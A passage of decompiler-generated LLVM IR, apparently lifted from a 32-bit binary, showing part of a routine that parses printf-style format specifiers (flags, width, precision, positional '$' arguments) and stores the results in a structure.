  %v4_805107528 = phi i32 [ %v6_8051075139, %dec_label_pc_8051065 ], [ %v3_805106d, %dec_label_pc_805106d ]
  %v1_8051074 = add i32 %v0_8051074138, 1
  store i32 %v1_8051074, i32* @esi, align 4
  %v1_8051075 = inttoptr i32 %v1_8051074 to i8*
  %v2_8051075 = load i8, i8* %v1_8051075, align 1
  %v3_8051075 = zext i8 %v2_8051075 to i32
  %v5_8051075 = and i32 %v4_805107528, -256
  %v6_8051075 = or i32 %v3_8051075, %v5_8051075
  store i32 %v6_8051075, i32* %eax.global-to-local, align 4
  %v2_8051077 = sext i8 %v2_8051075 to i32
  store i32 %v2_8051077, i32* @ecx, align 4
  %v2_805107a = mul nsw i32 %v2_8051077, 2
  %v3_805107a = add i32 %v2_805107a, %v0_805105d
  %v4_805107a = inttoptr i32 %v3_805107a to i8*
  %v5_805107a = load i8, i8* %v4_805107a, align 1
  %v6_805107a = and i8 %v5_805107a, 8
  %v7_805107a = icmp eq i8 %v6_805107a, 0
  %v1_805107f = icmp eq i1 %v7_805107a, false
  br i1 %v1_805107f, label %dec_label_pc_8051065, label %dec_label_pc_8051081

dec_label_pc_8051081:                             ; preds = %dec_label_pc_8051074, %dec_label_pc_805105b
  %v1_805106d.lcssa = phi i32 [ 0, %dec_label_pc_805105b ], [ %v0_805108f32, %dec_label_pc_8051074 ]
  %v0_8051074.lcssa = phi i32 [ %v0_8051075.pre, %dec_label_pc_805105b ], [ %v1_8051074, %dec_label_pc_8051074 ]
  %v2_8051075.lcssa = phi i8 [ %v2_8051075125, %dec_label_pc_805105b ], [ %v2_8051075, %dec_label_pc_8051074 ]
  %v6_8051075.lcssa = phi i32 [ %v6_8051075128, %dec_label_pc_805105b ], [ %v6_8051075, %dec_label_pc_8051074 ]
  %v0_8051081 = load i32, i32* @edx, align 4
  %v1_8051081 = add i32 %v0_8051081, -1
  %v2_8051081 = inttoptr i32 %v1_8051081 to i8*
  %v3_8051081 = load i8, i8* %v2_8051081, align 1
  %v12_8051081 = icmp eq i8 %v3_8051081, 37
  %v1_8051085 = icmp eq i1 %v12_8051081, false
  br i1 %v1_8051085, label %dec_label_pc_8051118, label %dec_label_pc_805108b

dec_label_pc_805108b:                             ; preds = %dec_label_pc_8051081
  %v10_805108b = icmp eq i8 %v2_8051075.lcssa, 36
  %v1_805108d = icmp eq i1 %v10_805108b, false
  br i1 %v1_805108d, label %dec_label_pc_80510bf, label %dec_label_pc_805108f

dec_label_pc_805108f:                             ; preds = %dec_label_pc_805108b
  %tmp89 = icmp slt i32 %v1_805106d.lcssa, 1
  br i1 %tmp89, label %dec_label_pc_80510bf, label %dec_label_pc_8051093

dec_label_pc_8051093:                             ; preds = %dec_label_pc_805108f
  %v1_8051093 = add i32 %v0_8051074.lcssa, 1
  store i32 %v1_8051093, i32* @edx, align 4
  %v4_8051096 = icmp eq i32 %stack_var_-88.1, 0
  br i1 %v4_8051096, label %dec_label_pc_8051363, label %dec_label_pc_80510a1

dec_label_pc_80510a1:                             ; preds = %dec_label_pc_8051093
  store i32 %stack_var_-88.1, i32* %ecx.global-to-local, align 4
  %v2_80510a9 = sub i32 %v1_805106d.lcssa, %stack_var_-88.1
  %v8_80510a9 = xor i32 %v1_805106d.lcssa, %stack_var_-88.1
  %v9_80510a9 = xor i32 %v2_80510a9, %v1_805106d.lcssa
  %v10_80510a9 = and i32 %v9_80510a9, %v8_80510a9
  %v11_80510a9 = icmp slt i32 %v10_80510a9, 0
  %v12_80510a9 = icmp eq i32 %v2_80510a9, 0
  %v13_80510a9 = icmp slt i32 %v2_80510a9, 0
  %v3_80510ab = icmp ne i1 %v13_80510a9, %v11_80510a9
  %v4_80510ab = or i1 %v12_80510a9, %v3_80510ab
  %stack_var_-88.1.v0_80510ad = select i1 %v4_80510ab, i32 %stack_var_-88.1, i32 %v1_805106d.lcssa
  br label %dec_label_pc_80510bb

dec_label_pc_80510bb:                             ; preds = %dec_label_pc_80510cf, %dec_label_pc_80510a1, %dec_label_pc_80510d3
  %v0_80510bb = phi i32 [ %v1_8051093, %dec_label_pc_80510a1 ], [ %v0_8051081, %dec_label_pc_80510d3 ], [ %v0_8051081, %dec_label_pc_80510cf ]
  %stack_var_-32.2 = phi i32 [ %v1_805106d.lcssa, %dec_label_pc_80510a1 ], [ %stack_var_-32.1, %dec_label_pc_80510d3 ], [ %stack_var_-32.1, %dec_label_pc_80510cf ]
  %stack_var_-88.2 = phi i32 [ %stack_var_-88.1.v0_80510ad, %dec_label_pc_80510a1 ], [ 0, %dec_label_pc_80510d3 ], [ 0, %dec_label_pc_80510cf ]
  store i32 %v0_80510bb, i32* @esi, align 4
  br label %dec_label_pc_80510e2

dec_label_pc_80510bf:                             ; preds = %dec_label_pc_805108f, %dec_label_pc_805108b
  %tmp90 = icmp slt i32 %stack_var_-88.1, 1
  br i1 %tmp90, label %dec_label_pc_80510cf, label %dec_label_pc_80510c6

dec_label_pc_80510c6:                             ; preds = %dec_label_pc_80510bf
  %v10_80510c6 = icmp eq i8 %v2_8051075.lcssa, 109
  br i1 %v10_80510c6, label %dec_label_pc_8051118, label %dec_label_pc_8051363

dec_label_pc_80510cf:                             ; preds = %dec_label_pc_80510bf
  %tmp185 = icmp ugt i32 %v0_8051074.lcssa, %v0_8051081
  br i1 %tmp185, label %dec_label_pc_80510d3, label %dec_label_pc_80510bb

dec_label_pc_80510d3:                             ; preds = %dec_label_pc_80510cf
  %v1_80510d3 = inttoptr i32 %v0_8051081 to i8*
  %v2_80510d3 = load i8, i8* %v1_80510d3, align 1
  %v8_80510d3 = icmp eq i8 %v2_80510d3, 48
  br i1 %v8_80510d3, label %dec_label_pc_80510bb, label %dec_label_pc_8051118

dec_label_pc_80510e2:                             ; preds = %dec_label_pc_80510f3, %dec_label_pc_80510bb
  %v0_805110e = phi i32 [ %v1_80510f3, %dec_label_pc_80510f3 ], [ %v0_80510bb, %dec_label_pc_80510bb ]
  %v4_80510ec35 = phi i32 [ %v6_80510ec.lcssa, %dec_label_pc_80510f3 ], [ %v6_8051075.lcssa, %dec_label_pc_80510bb ]
  store i32 1, i32* @ecx, align 4
  %v5_80510ec144 = and i32 %v4_80510ec35, -256
  %v6_80510ec145 = or i32 %v5_80510ec144, 32
  store i32 %v6_80510ec145, i32* %eax.global-to-local, align 4
  store i32 add (i32 ptrtoint ([8 x i8]* @global_var_805b64a.315 to i32), i32 1), i32* @edx, align 4
  %v1_80510ef = inttoptr i32 %v0_805110e to i8*
  %v2_80510ef146 = load i8, i8* %v1_80510ef, align 1
  %v15_80510ef147 = icmp eq i8 %v2_80510ef146, 32
  %v1_80510f1148 = icmp eq i1 %v15_80510ef147, false
  br i1 %v1_80510f1148, label %dec_label_pc_80510f8, label %dec_label_pc_80510f3

dec_label_pc_80510f3:                             ; preds = %dec_label_pc_80510fd, %dec_label_pc_80510e2
  %v0_80510fd.lcssa = phi i32 [ 1, %dec_label_pc_80510e2 ], [ %v2_80510fd, %dec_label_pc_80510fd ]
  %v6_80510ec.lcssa = phi i32 [ %v6_80510ec145, %dec_label_pc_80510e2 ], [ %v6_80510ec, %dec_label_pc_80510fd ]
  %v1_80510f3 = add i32 %v0_805110e, 1
  store i32 %v1_80510f3, i32* @esi, align 4
  %v0_80510f4 = load i32, i32* %edi.global-to-local, align 4
  %v2_80510f4 = or i32 %v0_80510f4, %v0_80510fd.lcssa
  store i32 %v2_80510f4, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_80510e2

dec_label_pc_80510f8:                             ; preds = %dec_label_pc_80510e2, %dec_label_pc_80510fd
  %v1_80510ee151 = phi i32 [ %v1_80510ee, %dec_label_pc_80510fd ], [ add (i32 ptrtoint ([8 x i8]* @global_var_805b64a.315 to i32), i32 1), %dec_label_pc_80510e2 ]
  %v6_80510ec150 = phi i32 [ %v6_80510ec, %dec_label_pc_80510fd ], [ %v6_80510ec145, %dec_label_pc_80510e2 ]
  %v0_80510fd149 = phi i32 [ %v2_80510fd, %dec_label_pc_80510fd ], [ 1, %dec_label_pc_80510e2 ]
  %v1_80510f8 = inttoptr i32 %v1_80510ee151 to i8*
  %v2_80510f8 = load i8, i8* %v1_80510f8, align 1
  %v3_80510f8 = icmp eq i8 %v2_80510f8, 0
  br i1 %v3_80510f8, label %dec_label_pc_8051101, label %dec_label_pc_80510fd

dec_label_pc_80510fd:                             ; preds = %dec_label_pc_80510f8
  %v2_80510fd = mul i32 %v0_80510fd149, 2
  store i32 %v2_80510fd, i32* @ecx, align 4
  %v2_80510ec = load i8, i8* %v1_80510f8, align 1
  %v3_80510ec = zext i8 %v2_80510ec to i32
  %v5_80510ec = and i32 %v6_80510ec150, -256
  %v6_80510ec = or i32 %v3_80510ec, %v5_80510ec
  store i32 %v6_80510ec, i32* %eax.global-to-local, align 4
  %v1_80510ee = add i32 %v1_80510ee151, 1
  store i32 %v1_80510ee, i32* @edx, align 4
  %v2_80510ef = load i8, i8* %v1_80510ef, align 1
  %v15_80510ef = icmp eq i8 %v2_80510ef, %v2_80510ec
  %v1_80510f1 = icmp eq i1 %v15_80510ef, false
  br i1 %v1_80510f1, label %dec_label_pc_80510f8, label %dec_label_pc_80510f3

dec_label_pc_8051101:                             ; preds = %dec_label_pc_80510f8
  %v0_8051101 = load i32, i32* %edi.global-to-local, align 4
  store i32 0, i32* %ebx.global-to-local, align 4
  %v1_8051105 = udiv i32 %v0_8051101, 2
  %v1_8051105.not = or i32 %v1_8051105, -6
  %v1_805110a = xor i32 %v1_8051105.not, 5
  store i32 %v1_805110a, i32* %eax.global-to-local, align 4
  %v2_805110c = and i32 %v1_805110a, %v0_8051101
  store i32 %v2_805110c, i32* %edi.global-to-local, align 4
  %v1_805110e = add i32 %v0_805110e, -1
  %v2_805110e = inttoptr i32 %v1_805110e to i8*
  %v3_805110e = load i8, i8* %v2_805110e, align 1
  %v12_805110e = icmp eq i8 %v3_805110e, 37
  %v1_8051112 = icmp eq i1 %v12_805110e, false
  br i1 %v1_8051112, label %dec_label_pc_8051044, label %dec_label_pc_8051118

dec_label_pc_8051118:                             ; preds = %dec_label_pc_80510d3, %dec_label_pc_8051101, %dec_label_pc_8051081, %dec_label_pc_80510c6
  %v0_805113b = phi i32 [ %v1_805106d.lcssa, %dec_label_pc_80510c6 ], [ %v1_805106d.lcssa, %dec_label_pc_80510d3 ], [ 0, %dec_label_pc_8051101 ], [ %v1_805106d.lcssa, %dec_label_pc_8051081 ]
  %v1_8051144 = phi i32 [ %v0_8051074.lcssa, %dec_label_pc_80510c6 ], [ %v0_8051074.lcssa, %dec_label_pc_80510d3 ], [ %v0_805110e, %dec_label_pc_8051101 ], [ %v0_8051074.lcssa, %dec_label_pc_8051081 ]
  %v0_8051141 = phi i32 [ %v0_8051081, %dec_label_pc_80510c6 ], [ %v0_8051081, %dec_label_pc_80510d3 ], [ %v1_80510ee151, %dec_label_pc_8051101 ], [ %v0_8051081, %dec_label_pc_8051081 ]
  %stack_var_-32.3 = phi i32 [ %stack_var_-32.1, %dec_label_pc_80510c6 ], [ %stack_var_-32.1, %dec_label_pc_80510d3 ], [ %stack_var_-32.2, %dec_label_pc_8051101 ], [ %stack_var_-32.1, %dec_label_pc_8051081 ]
  %stack_var_-88.3 = phi i32 [ %stack_var_-88.1, %dec_label_pc_80510c6 ], [ 0, %dec_label_pc_80510d3 ], [ %stack_var_-88.2, %dec_label_pc_8051101 ], [ %stack_var_-88.1, %dec_label_pc_8051081 ]
  %v1_8051118 = inttoptr i32 %v0_8051141 to i8*
  %v2_8051118 = load i8, i8* %v1_8051118, align 1
  %v11_8051118 = icmp eq i8 %v2_8051118, 42
  %v1_805111b = icmp eq i1 %v11_8051118, false
  br i1 %v1_805111b, label %dec_label_pc_8051151, label %dec_label_pc_805111d

dec_label_pc_805111d:                             ; preds = %dec_label_pc_8051118
  %v4_805111d = icmp eq i32 %stack_var_-88.3, 0
  br i1 %v4_805111d, label %dec_label_pc_8051141, label %dec_label_pc_8051124

dec_label_pc_8051124:                             ; preds = %dec_label_pc_805111d
  %v1_8051124 = inttoptr i32 %v1_8051144 to i8*
  %v2_8051124 = load i8, i8* %v1_8051124, align 1
  %v11_8051124 = icmp eq i8 %v2_8051124, 36
  %v1_8051127 = icmp eq i1 %v11_8051124, false
  br i1 %v1_8051127, label %dec_label_pc_8051363, label %dec_label_pc_805112d

dec_label_pc_805112d:                             ; preds = %dec_label_pc_8051124
  %tmp91 = icmp slt i32 %v0_805113b, 1
  br i1 %tmp91, label %dec_label_pc_8051363, label %dec_label_pc_8051135

dec_label_pc_8051135:                             ; preds = %dec_label_pc_805112d
  store i32 %v8_805104b, i32* %eax.global-to-local, align 4
  %v1_805113a = add i32 %v1_8051144, 1
  store i32 %v1_805113a, i32* @esi, align 4
  %v1_805113b = load i32, i32* @esp, align 4
  %v3_805113b = add i32 %v8_805104b, 68
  %v4_805113b = add i32 %v3_805113b, %v1_805113b
  %v5_805113b = inttoptr i32 %v4_805113b to i32*
  store i32 %v0_805113b, i32* %v5_805113b, align 4
  %v0_805117f.pre.pre.pre.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_805114c

dec_label_pc_8051141:                             ; preds = %dec_label_pc_805111d
  %v1_8051141 = add i32 %v0_8051141, 1
  store i32 %v1_8051141, i32* %eax.global-to-local, align 4
  %v12_8051144 = icmp eq i32 %v1_8051141, %v1_8051144
  %v1_8051146 = icmp eq i1 %v12_8051144, false
  br i1 %v1_8051146, label %dec_label_pc_8051363, label %dec_label_pc_805114c

dec_label_pc_805114c:                             ; preds = %dec_label_pc_8051141, %dec_label_pc_8051135
  %v0_805117f.pre.pre.pre = phi i32 [ %v1_8051144, %dec_label_pc_8051141 ], [ %v0_805117f.pre.pre.pre.pre, %dec_label_pc_8051135 ]
  store i32 -2147483648, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8051151

dec_label_pc_8051151:                             ; preds = %dec_label_pc_8051118, %dec_label_pc_805114c
  %v0_805117f.pre.pre = phi i32 [ %v1_8051144, %dec_label_pc_8051118 ], [ %v0_805117f.pre.pre.pre, %dec_label_pc_805114c ]
  %v0_8050fea = phi i32 [ %v0_805113b, %dec_label_pc_8051118 ], [ -2147483648, %dec_label_pc_805114c ]
  %v4_8051151 = trunc i64 %stack_var_-92.1.ph to i32
  %v5_8051151 = icmp eq i32 %v4_8051151, 0
  %v1_8051156 = icmp eq i1 %v5_8051151, false
  %.pre = inttoptr i32 %v0_805117f.pre.pre to i8*
  br i1 %v1_8051156, label %dec_label_pc_805117a, label %dec_label_pc_805115c

dec_label_pc_805115c:                             ; preds = %dec_label_pc_8051151
  %v2_805115c = load i8, i8* %.pre, align 1
  %v11_805115c = icmp eq i8 %v2_805115c, 46
  %v1_805115f = icmp eq i1 %v11_805115c, false
  br i1 %v1_805115f, label %dec_label_pc_8051173, label %dec_label_pc_8051161

dec_label_pc_8051161:                             ; preds = %dec_label_pc_805115c
  %v1_8051161 = add i32 %v0_805117f.pre.pre, 1
  store i32 %v1_8051161, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8051044.outer

dec_label_pc_8051173:                             ; preds = %dec_label_pc_805115c
  br label %dec_label_pc_805117a

dec_label_pc_805117a:                             ; preds = %dec_label_pc_8051151, %dec_label_pc_8051173
  %stack_var_-96.2 = phi i32 [ %v0_8050fea, %dec_label_pc_8051173 ], [ %stack_var_-96.1.ph, %dec_label_pc_8051151 ]
  %storemerge4 = phi i32 [ -1, %dec_label_pc_8051173 ], [ %v0_8050fea, %dec_label_pc_8051151 ]
  store i32 %storemerge4, i32* %ebp.global-to-local, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_805b5f8.316 to i32), i32* @edx, align 4
  %v4_805117f.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805117f

dec_label_pc_805117f:                             ; preds = %dec_label_pc_8051189, %dec_label_pc_805117a
  %v0_8051189 = phi i32 [ %v1_8051189, %dec_label_pc_8051189 ], [ ptrtoint ([9 x i8]* @global_var_805b5f8.316 to i32), %dec_label_pc_805117a ]
  %v4_805117f = phi i32 [ %v6_805117f, %dec_label_pc_8051189 ], [ %v4_805117f.pre, %dec_label_pc_805117a ]
  %v2_805117f = load i8, i8* %.pre, align 1
  %v3_805117f = zext i8 %v2_805117f to i32
  %v5_805117f = and i32 %v4_805117f, -256
  %v6_805117f = or i32 %v3_805117f, %v5_805117f
  store i32 %v6_805117f, i32* %eax.global-to-local, align 4
  %v3_8051181 = inttoptr i32 %v0_8051189 to i8*
  %v4_8051181 = load i8, i8* %v3_8051181, align 1
  %v15_8051181 = icmp eq i8 %v2_805117f, %v4_8051181
  br i1 %v15_8051181, label %dec_label_pc_8050ff1, label %dec_label_pc_8051189

dec_label_pc_8051189:                             ; preds = %dec_label_pc_805117f
  %v1_8051189 = add i32 %v0_8051189, 1
  store i32 %v1_8051189, i32* @edx, align 4
  %v1_805118a = inttoptr i32 %v1_8051189 to i8*
  %v2_805118a = load i8, i8* %v1_805118a, align 1
  %v3_805118a = icmp eq i8 %v2_805118a, 0
  %v1_805118d = icmp eq i1 %v3_805118a, false
  br i1 %v1_805118d, label %dec_label_pc_805117f, label %dec_label_pc_805118f

dec_label_pc_805118f:                             ; preds = %dec_label_pc_8051189, %dec_label_pc_8050ff1
  %v0_80511a2 = phi i32 [ %v1_8050ff1, %dec_label_pc_8050ff1 ], [ %v0_805117f.pre.pre, %dec_label_pc_8051189 ]
  %v0_805119f = phi i32 [ %v0_8051189, %dec_label_pc_8050ff1 ], [ %v1_8051189, %dec_label_pc_8051189 ]
  %v1_8051191 = add i32 %v0_805119f, -134591992
  %v1_8051196 = add i32 %v0_805119f, -134591993
  %v5_8051196 = sub i32 134591992, %v0_805119f
  %v6_8051196 = and i32 %v1_8051191, %v5_8051196
  %v7_8051196 = icmp slt i32 %v6_8051196, 0
  %v8_8051196 = icmp eq i32 %v1_8051196, 0
  %v9_8051196 = icmp slt i32 %v1_8051196, 0
  store i32 %v1_8051196, i32* %eax.global-to-local, align 4
  %v3_8051197 = icmp eq i1 %v9_8051196, %v7_8051196
  %v4_8051197 = icmp eq i1 %v8_8051196, false
  %v5_8051197 = and i1 %v4_8051197, %v3_8051197
  br i1 %v5_8051197, label %dec_label_pc_80511a3, label %dec_label_pc_8051199

dec_label_pc_8051199:                             ; preds = %dec_label_pc_805118f
  %v1_8051199 = inttoptr i32 %v0_80511a2 to i8*
  %v2_8051199 = load i8, i8* %v1_8051199, align 1
  %v3_8051199 = zext i8 %v2_8051199 to i32
  %v5_8051199 = and i32 %v1_8051196, -256
  %v6_8051199 = or i32 %v3_8051199, %v5_8051199
  store i32 %v6_8051199, i32* %eax.global-to-local, align 4
  %v3_805119b = inttoptr i32 %v0_805119f to i8*
  %v4_805119b = load i8, i8* %v3_805119b, align 1
  %v15_805119b = icmp eq i8 %v2_8051199, %v4_805119b
  %v1_805119d = icmp eq i1 %v15_805119b, false
  br i1 %v1_805119d, label %dec_label_pc_80511a3, label %dec_label_pc_805119f

dec_label_pc_805119f:                             ; preds = %dec_label_pc_8051199
  %v1_805119f = add i32 %v0_805119f, 9
  store i32 %v1_805119f, i32* @edx, align 4
  %v1_80511a2 = add i32 %v0_80511a2, 1
  store i32 %v1_80511a2, i32* @esi, align 4
  br label %dec_label_pc_80511a3

dec_label_pc_80511a3:                             ; preds = %dec_label_pc_8051199, %dec_label_pc_805118f, %dec_label_pc_805119f
  %v4_80511aa = phi i32 [ %v6_8051199, %dec_label_pc_8051199 ], [ %v1_8051196, %dec_label_pc_805118f ], [ %v6_8051199, %dec_label_pc_805119f ]
  %v0_80511aa = phi i32 [ %v0_80511a2, %dec_label_pc_8051199 ], [ %v0_80511a2, %dec_label_pc_805118f ], [ %v1_80511a2, %dec_label_pc_805119f ]
  %v0_80511a3 = phi i32 [ %v0_805119f, %dec_label_pc_8051199 ], [ %v0_805119f, %dec_label_pc_805118f ], [ %v1_805119f, %dec_label_pc_805119f ]
  %v1_80511a3 = add i32 %v0_80511a3, 9
  %v2_80511a3 = inttoptr i32 %v1_80511a3 to i8*
  %v3_80511a3 = load i8, i8* %v2_80511a3, align 1
  %v4_80511a3 = sext i8 %v3_80511a3 to i32
  %v2_80511a7 = mul nsw i32 %v4_80511a3, 256
  store i32 %v2_80511a7, i32* %ebx.global-to-local, align 4
  %v1_80511aa = inttoptr i32 %v0_80511aa to i8*
  %v2_80511aa = load i8, i8* %v1_80511aa, align 1
  %v3_80511aa = zext i8 %v2_80511aa to i32
  %v5_80511aa = and i32 %v4_80511aa, -256
  %v6_80511aa = or i32 %v3_80511aa, %v5_80511aa
  store i32 %v6_80511aa, i32* %eax.global-to-local, align 4
  %v4_80511ac = icmp eq i8 %v2_80511aa, 0
  br i1 %v4_80511ac, label %dec_label_pc_8051363, label %dec_label_pc_80511b4

dec_label_pc_80511b4:                             ; preds = %dec_label_pc_80511a3
  store i32 ptrtoint ([21 x i8]* @global_var_805b635.317 to i32), i32* %ecx.global-to-local, align 4
  %v3_80511b9 = load i32, i32* %stack_var_-20, align 4
  store i32 %v3_80511b9, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_80511bd

dec_label_pc_80511bd:                             ; preds = %dec_label_pc_805120c, %dec_label_pc_80511b4
  %v0_805120c = phi i32 [ %v1_805120c, %dec_label_pc_805120c ], [ ptrtoint ([21 x i8]* @global_var_805b635.317 to i32), %dec_label_pc_80511b4 ]
  %v3_80511bd = inttoptr i32 %v0_805120c to i8*
  %v4_80511bd = load i8, i8* %v3_80511bd, align 1
  %v15_80511bd = icmp eq i8 %v2_80511aa, %v4_80511bd
  %v1_80511bf = icmp eq i1 %v15_80511bd, false
  br i1 %v1_80511bf, label %dec_label_pc_805120c, label %dec_label_pc_80511c1

dec_label_pc_80511c1:                             ; preds = %dec_label_pc_80511bd
  %v1_80511c3 = add i32 %v0_805120c, -134592053
  store i32 %v1_80511c3, i32* %edx.global-to-local, align 4
  %v7_80511cc = icmp sgt i32 %v1_80511c3, 17
  br i1 %v7_80511cc, label %dec_label_pc_80511ce, label %dec_label_pc_80511d6

dec_label_pc_80511ce:                             ; preds = %dec_label_pc_80511c1
  %v3_80511ce = and i32 %v2_80511a7, 1024
  %v4_80511ce = icmp eq i32 %v3_80511ce, 0
  br i1 %v4_80511ce, label %dec_label_pc_80511d6, label %dec_label_pc_80511d3

dec_label_pc_80511d3:                             ; preds = %dec_label_pc_80511ce
  %v1_80511d3 = add i32 %v0_805120c, -134592055
  store i32 %v1_80511d3, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_80511d6

dec_label_pc_80511d6:                             ; preds = %dec_label_pc_80511c1, %dec_label_pc_80511ce, %dec_label_pc_80511d3
  %v0_80511df = phi i32 [ %v1_80511c3, %dec_label_pc_80511c1 ], [ %v1_80511c3, %dec_label_pc_80511ce ], [ %v1_80511d3, %dec_label_pc_80511d3 ]
  store i32 %tmp76, i32* %eax.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_805b62b.318 to i32), i32* %ecx.global-to-local, align 4
  %v2_80511df = add i32 %tmp76, 32
  %v3_80511df = inttoptr i32 %v2_80511df to i32*
  store i32 %v0_80511df, i32* %v3_80511df, align 4
  %v0_80511e2.pre = load i32, i32* %ecx.global-to-local, align 4
  %v0_80511e6.pre = load i32, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_80511e2

dec_label_pc_80511e2:                             ; preds = %dec_label_pc_80511e2, %dec_label_pc_80511d6
  %v0_80511e2 = phi i32 [ %v1_80511e2, %dec_label_pc_80511e2 ], [ %v0_80511e2.pre, %dec_label_pc_80511d6 ]
  %v1_80511e2 = add i32 %v0_80511e2, 1
  store i32 %v1_80511e2, i32* %ecx.global-to-local, align 4
  %v1_80511e3 = inttoptr i32 %v1_80511e2 to i8*
  %v2_80511e3 = load i8, i8* %v1_80511e3, align 1
  %v3_80511e3 = sext i8 %v2_80511e3 to i32
  store i32 %v3_80511e3, i32* %eax.global-to-local, align 4
  %v8_80511e8 = icmp sgt i32 %v0_80511e6.pre, %v3_80511e3
  br i1 %v8_80511e8, label %dec_label_pc_80511e2, label %dec_label_pc_80511ea

dec_label_pc_80511ea:                             ; preds = %dec_label_pc_80511e2
  store i32 ptrtoint ([21 x i8]* @global_var_805b635.317 to i32), i32* @ecx, align 4
  %v1_80511f1 = add i32 %v0_80511e2, -134592043
  store i32 %v1_80511f1, i32* %eax.global-to-local, align 4
  %v2_80511f6 = add i32 %v0_80511e2, add (i32 ptrtoint (i32* @global_var_805b61c.319 to i32), i32 -134592043)
  %v3_80511f6 = add i32 %v2_80511f6, %v1_80511f1
  %v4_80511f6 = inttoptr i32 %v3_80511f6 to i16*
  %v5_80511f6 = load i16, i16* %v4_80511f6, align 2
  %v6_80511f6 = sext i16 %v5_80511f6 to i32
  store i32 %v6_80511f6, i32* %edx.global-to-local, align 4
  %factor = mul i32 %v1_80511f1, 2
  %v3_80511fe = add i32 %factor, 134592012
  %v4_80511fe = inttoptr i32 %v3_80511fe to i16*
  %v5_80511fe = load i16, i16* %v4_80511fe, align 2
  %v6_80511fe = sext i16 %v5_80511fe to i32
  store i32 %v6_80511fe, i32* %eax.global-to-local, align 4
  %v1_8051206 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8051206 = or i32 %v1_8051206, %v6_80511f6
  %v2_8051208 = and i32 %v2_8051206, %v6_80511fe
  store i32 %v2_8051208, i32* %edx.global-to-local, align 4
  %v0_805121a.pre = load i32, i32* @esi, align 4
  %v0_805121d.pre = load i32, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_8051212

dec_label_pc_805120c:                             ; preds = %dec_label_pc_80511bd
  %v1_805120c = add i32 %v0_805120c, 1
  store i32 %v1_805120c, i32* @ecx, align 4
  %v1_805120d = inttoptr i32 %v1_805120c to i8*
  %v2_805120d = load i8, i8* %v1_805120d, align 1
  %v3_805120d = icmp eq i8 %v2_805120d, 0
  %v1_8051210 = icmp eq i1 %v3_805120d, false
  br i1 %v1_8051210, label %dec_label_pc_80511bd, label %dec_label_pc_8051212

dec_label_pc_8051212:                             ; preds = %dec_label_pc_805120c, %dec_label_pc_80511ea
  %v0_805121d = phi i32 [ %v0_805121d.pre, %dec_label_pc_80511ea ], [ %storemerge4, %dec_label_pc_805120c ]
  %v0_805121a = phi i32 [ %v0_805121a.pre, %dec_label_pc_80511ea ], [ %v0_80511aa, %dec_label_pc_805120c ]
  %v0_8051212 = phi i32 [ %v2_8051208, %dec_label_pc_80511ea ], [ %v3_80511b9, %dec_label_pc_805120c ]
  store i32 %v0_8051212, i32* %stack_var_-20, align 4
  store i32 %tmp76, i32* @edx, align 4
  %v1_805121a = inttoptr i32 %v0_805121a to i8*
  %v2_805121a = load i8, i8* %v1_805121a, align 1
  %v3_805121a = sext i8 %v2_805121a to i32
  store i32 %v3_805121a, i32* %eax.global-to-local, align 4
  %v2_805121d = add i32 %tmp76, 4
  %v3_805121d = inttoptr i32 %v2_805121d to i32*
  store i32 %v0_805121d, i32* %v3_805121d, align 4
  %v0_8051220 = load i32, i32* %eax.global-to-local, align 4
  %v1_8051220 = load i32, i32* @edx, align 4
  %v2_8051220 = add i32 %v1_8051220, 12
  %v3_8051220 = inttoptr i32 %v2_8051220 to i32*
  store i32 %v0_8051220, i32* %v3_8051220, align 4
  store i32 %stack_var_-96.2, i32* %eax.global-to-local, align 4
  %v0_8051227 = load i32, i32* @edx, align 4
  %v1_8051227 = add i32 %v0_8051227, 28
  %v2_8051227 = inttoptr i32 %v1_8051227 to i32*
  store i32 1, i32* %v2_8051227, align 4
  %v0_805122e = load i32, i32* %eax.global-to-local, align 4
  %v1_805122e = load i32, i32* @edx, align 4
  %v2_805122e = add i32 %v1_805122e, 8
  %v3_805122e = inttoptr i32 %v2_805122e to i32*
  store i32 %v0_805122e, i32* %v3_805122e, align 4
  %v0_8051231 = load i32, i32* %edi.global-to-local, align 4
  %v1_805123b = and i32 %v0_8051231, -5
  %v0_8051241 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8051241 = and i32 %v0_8051241, 3840
  store i32 %v1_8051241, i32* %ebx.global-to-local, align 4
  store i32 48, i32* %eax.global-to-local, align 4
  %v2_805124a = or i32 %v1_8051241, %v1_805123b
  store i32 %v2_805124a, i32* @edi, align 4
  %v1_805124c = load i32, i32* @edx, align 4
  %v2_805124c = add i32 %v1_805124c, 20
  %v3_805124c = inttoptr i32 %v2_805124c to i32*
  store i32 48, i32* %v3_805124c, align 4
  %v0_805124f = load i32, i32* @edi, align 4
  %v1_805124f = load i32, i32* @edx, align 4
  %v2_805124f = add i32 %v1_805124f, 16
  %v3_805124f = inttoptr i32 %v2_805124f to i32*
  store i32 %v0_805124f, i32* %v3_805124f, align 4
  %v0_8051252 = load i32, i32* @ecx, align 4
  %v1_8051252 = inttoptr i32 %v0_8051252 to i8*
  %v2_8051252 = load i8, i8* %v1_8051252, align 1
  %v3_8051252 = icmp eq i8 %v2_8051252, 0
  %v1_8051255 = icmp eq i1 %v3_8051252, false
  br i1 %v1_8051255, label %dec_label_pc_805126e, label %dec_label_pc_8051257

dec_label_pc_8051257:                             ; preds = %dec_label_pc_8051212
  %v0_8051257 = load i32, i32* @esi, align 4
  %v1_8051257 = inttoptr i32 %v0_8051257 to i8*
  %v2_8051257 = load i8, i8* %v1_8051257, align 1
  %v11_8051257 = icmp eq i8 %v2_8051257, 109
  %v1_805125a = icmp eq i1 %v11_8051257, false
  br i1 %v1_805125a, label %dec_label_pc_8051363, label %dec_label_pc_8051260

dec_label_pc_8051260:                             ; preds = %dec_label_pc_8051257
  %v0_8051260 = load i32, i32* @edx, align 4
  %v1_8051260 = add i32 %v0_8051260, 32
  %v2_8051260 = inttoptr i32 %v1_8051260 to i32*
